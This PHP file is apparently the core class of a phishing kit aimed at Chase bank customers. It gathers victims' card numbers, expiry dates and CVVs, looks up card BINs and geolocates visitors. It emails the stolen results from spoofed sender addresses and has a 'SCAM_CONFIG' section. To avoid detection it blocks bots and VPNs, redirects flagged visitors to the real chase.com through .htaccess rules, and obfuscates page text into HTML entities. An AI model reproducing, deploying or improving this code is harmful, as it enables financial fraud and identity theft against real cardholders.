<?php
defined('SYSTEM_PATH') or die('404 not found.');

/*
Nubicod Since 2015.
Ruthvens Family never die.
We live in silent and peacefully.
Long life fams.
*/

class Core extends PCInfo
{

  public function __construct()
  {
      parent::__construct();
      $this->_save_as_session();
  }

  # MAIN FUNCTION #
  # DON'T MAKE ANY CHANGE #
  /* # ######################################################################### # */
  /* # */ public function _save_ses($key, $value){ $_SESSION[$key] = $value; }
  /* # */ public function _get_ses($name){ return isset($_SESSION[$name]) ? $_SESSION[$name] : NULL; }
  /* # */ public function _redirect($kmn = '?', $delay = 0){ echo "<META HTTP-EQUIV='REFRESH' CONTENT='" . $delay . ";url=" . $kmn . "'/>";exit;}
  /* # */ public function _dir($dir){ return SYSTEM_PATH."/NubicodStyle/".$dir; }
  /* # */ public function _getStr($string, $start, $end){ $str = explode($start, $string); $str = explode($end, $str[1]); return $str[0]; }
  /* # */ public function _randommicro(){ return sha1(microtime()); }
  /* # */ public function _checkcc(){ $cc = str_replace(' ','', $this->_get_ses('cardnumber')); $exp = str_replace('/','|',$this->_get_ses('expire')); return $cc."|".$exp."|".$this->_get_ses('cvv'); }
  /* # */ public function _re_date(){ return date('D, F d, Y  g:i A'); }
  /* # */ public function _write($file, $text, $type){ $fp = fopen($file, $type); return fwrite($fp, $text); fclose($fp); }
  /* # */ public function _blocks(){ return $this->_write(SYSTEM_PATH . '/.htaccess', "RewriteCond %{REMOTE_ADDR} ^" . $_SERVER['REMOTE_ADDR'] . "$\r\nRewriteRule .* https://href.li/?https://www.chase.com/ [R,L]\r\n\r\n", 'a'); }
  /* # */ public function _visitor($msg = 'no message'){ $text = $this->_get_ses('ip') . " has been " . $msg . " @ " . date('d-m-Y H:i:s') . "\r\n"; return $this->_write(SYSTEM_PATH . '/NubicodStyle/logs/visitor.log', $text, 'a'); }
  /* # */ public function _bot($file){ $path    = SYSTEM_PATH . '/NubicodStyle/system/bots/' . trim($file) . '.bot'; $array = preg_split('/\n|\r\n?/', trim(file_get_contents($path))); return $array; }
  /* # */ public function _logbot($bottype, $msg = 'no message', $file){ $text = $bottype . " => " . $msg . " | " . $this->_get_ses('ip') . " | " . $this->_get_ses('isp') . " | " . $this->_get_ses('host') . " | " . $this->_get_ses('platform') . " | " . $this->agent  . " | " . $this->_re_date() . "\r\n"; return $this->_write($file, $text, 'a'); }
  /* # */ public function _sendlog($type, $to, $send, $result){ $text = $type . " has " . $result . " sent " . $send .  " to " . $to . " @ " . date('d-m-Y H:i:s') . "\r\n"; return $this->_write(SYSTEM_PATH . '/NubicodStyle/logs/sending.log', $text, 'a'); }
  /* # */ public function updateJmlh($dir){ $path = SYSTEM_PATH . '/NubicodStyle/logs/'. $dir; $no = file_get_contents($path); $no = (int)$no+1; return $this->_write($path, $no, 'w'); }
  /* # ######################################################################### # */

  # Config Function #
  public function _on_load()
  {
    if (!file_exists(SYSTEM_PATH . '/NubicodStyle/system/setting/config.ini')) {
        return FALSE;
    } else {
        return TRUE;
    }
  }

  public function _config($key, $path = NULL)
  {
    if ($path != NULL) {
        $file = parse_ini_file(SYSTEM_PATH . '/NubicodStyle/system/setting/' . $path . '.ini');
    } else {
        $file = parse_ini_file(SYSTEM_PATH . '/NubicodStyle/system/setting/config.ini');
    }
    return $file[$key];
  }

  public function _smtp($key = NULL)
  {
    if (!file_exists(SYSTEM_PATH . '/NubicodStyle/system/setting/smtp.ini')) {
        return FALSE;
    } else {
        return $this->_config($key, 'smtp');
    }
  }

  public function _create($data = array(), $path = NULL)
  {
    if ($path == 'smtp') {
        $data = [
            'SMTP_CONFIG' => array(
                'host' => $data['host'],
                'port' => $data['port'],
                'secure' => $data['secure'],
                'username' => $data['username'],
                'password' => $data['password']
            )
        ];

    } else {
        $data = [
            'CONFIG_BLOCKER' => array(
                'block_isp' => $data['block_isp'],
                'block_vpn' => $data['block_vpn'],
                'block_ip' => $data['block_ip'],
                'block_host' => $data['block_host'],
                'block_useragent' => $data['block_ua'],
                'lock_us' => $data['lock_us']
            ),
            'CONFIG_PANEL' => array(
                'password' => $data['passcam']
            ),
            'SCAM_CONFIG' => array(
                'result' => $data['result'],
                'sender' => $data['sender'],
                'parameter' => $data['parameter']
            )
        ];
    }

    if ($path != NULL) {
        $file = SYSTEM_PATH . '/NubicodStyle/system/setting/' . $path . '.ini';
    } else {
        $file = SYSTEM_PATH . '/NubicodStyle/system/setting/config.ini';
    }

    parent::write_ini_file($data, $file, true);
    return TRUE;
  }
  # Config Function #

  # Location Info Function #
  public function _save_as_session()
  {
    $this->_geoGet();
    $this->_save_ses('ip', $this->ip_address);
    $this->_save_ses('host', $this->hostname);
    $this->_save_ses('useragent', $this->agent);
    $this->_save_ses('isp', $this->isp);
    $this->_save_ses('country', $this->country);
    $this->_save_ses('countryCode', $this->countryCode);
    $this->_save_ses('regionName', $this->regionName);
    $this->_save_ses('platform', $this->platform);
    $this->is_mobile ? $this->_save_ses('mobile', $this->mobile) : $this->_save_ses('browser', $this->browser);
  }

  public function _geoGet()
  {
      $url               = "http://ip-api.com/json/" . $this->ip_address;
      $getGeo            = json_decode($this->curl($url, false, true));
      $this->isp         = $getGeo->isp;
      $this->country     = $getGeo->country;
      $this->countryCode = $getGeo->countryCode;
      $this->regionName  = $getGeo->regionName;
  }
  # Location Info Function #

  # BIN Info Function #
  public function _bin($num){
    $num    = str_replace(' ', '', trim($num));
    $num    = substr($num, 0, 6);
    $url    = "https://www.cardbinlist.com/search.html?bin=".$num;
    $result = $this->curl($url, false);
    preg_match_all("/<td>(.*)<\/td>/",$result,$pisah);
    preg_match_all("/target=\"_blank\">(.*)<\/a><\/td>/",$result,$pisah2);
    $bin['brand'] = $pisah2[1][3];
    $bin['type']  = strtoupper($pisah2[1][4]);
    $bin['level'] = $pisah2[1][5];
    $bin['bank']  = $pisah2[1][2];
    return $num." - ".implode(' ', $bin);
  }
  # BIN Info Function #

  # SEND FUNCTION #
  public function _send($to, $from, $subject, $message, $type)
  {
      require_once(__DIR__ . '/SMTP.nubicod.php');
      require_once(__DIR__ . '/PHPMailer.nubicod.php');

      $mail     = New PHPMailer;
      $fromMail = $type . "@result-" . rand() . ".ruthvens.fams";
      if ($this->_config('sender') == 0) {
        if ($this->_smtp() === FALSE) {
          $mail->isMail();
        } else {
          $mail->IsSMTP();
          $mail->SMTPDebug  = 2;
          $mail->Host       = $this->_smtp('host');
          $mail->Port       = $this->_smtp('port');
          $mail->SMTPSecure = $this->_smtp('secure');
          $mail->SMTPAuth   = true;
          $mail->Username   = $this->_smtp('username');
          $mail->Password   = $this->_smtp('password');
        }
      } else {
          $mail->isMail();
      }
      $mail->CharSet     = "UTF-8";
      $mail->ContentType = "text/html";
      $mail->Priority    = 2;
      $mail->SingleTo    = true;
      $mail->SetFrom($fromMail, $from);
      $mail->Subject = $subject;
      $mail->AltBody = $message;
      $mail->Body    = $message;
      $mail->addAddress($to);
      if ($mail->send()) {
          return TRUE;
      } else {
          return FALSE;
      }
  }
  # SEND FUNCTION #

  # OTHER FUNCTION #
      public function _get_email($email)
      {
          if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
              if (preg_match("/@gmail/", $email)) {
                  return 'gmail';
              } elseif (preg_match("/@hotmail|@outlook|@live|@msn/", $email)) {
                  return 'microsoft';
              } elseif (preg_match("/@yandex/", $email)) {
                  return 'yandex';
              } elseif (preg_match("/@icloud|@mac|@me/", $email)) {
                  return 'icloud';
              } elseif (preg_match("/@yahoo|@ymail|@rocketmail/", $email)) {
                  return 'yahoo';
              } elseif (preg_match("/@aol/", $email)) {
                  return 'aol';
              } else {
                  return false;
              }
          } else {
              return false;
          }
      }

      public function _encText($pain_text = "")
      {
          $crypt       = ["A" => "065", "a" => "097", "B" => "066", "b" => "098", "C" => "067", "c" => "099", "D" => "068", "d" => "100", "E" => "069", "e" => "101", "F" => "070", "f" => "102", "G" => "071", "g" => "103", "H" => "072", "h" => "104", "I" => "073", "i" => "105", "J" => "074", "j" => "106", "K" => "075", "k" => "107", "L" => "076", "l" => "108", "M" => "077", "m" => "109", "N" => "078", "n" => "110", "O" => "079", "o" => "111", "P" => "080", "p" => "112", "Q" => "081", "q" => "113", "R" => "082", "r" => "114", "S" => "083", "s" => "115", "T" => "084", "t" => "116", "U" => "085", "u" => "117", "V" => "086", "v" => "118", "W" => "087", "w" => "119", "X" => "088", "x" => "120", "Y" => "089", "y" => "121", "Z" => "090", "z" => "122", "0" => "048", "1" => "049", "2" => "050", "3" => "051", "4" => "052", "5" => "053", "6" => "054", "7" => "055", "8" => "056", "9" => "057", "&" => "038", " " => "032", "_" => "095", "-" => "045", "@" => "064", "." => "046"];
          $crypted_css = "";
          for ($i = 0; $i < strlen($pain_text); $i++) {
              $y = substr($pain_text, $i, 1);
              if (array_key_exists($y, $crypt)) {
                  $rand1 = rand(1, 3);
                  if ($rand1 == '2') {
                      $crypted_css = $crypted_css . $y;
                  } else {
                      $crypted_css = $crypted_css . "&#" . $crypt[$y] . ";";
                  }
              } else {
                  $crypted_css = $crypted_css . $y;
              }
          }
          return $crypted_css;
      }

      public function _enc()
      {
        $long = rand(11,150);
        $letters   = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        $letters = str_split($letters);
        $retrn = "";
        for ($i = 0; $i < $long; $i++) {
            $nol     = rand(0, 62);
            $retrn .= $letters[$nol];
        }

        return $retrn;
      }



}



?>
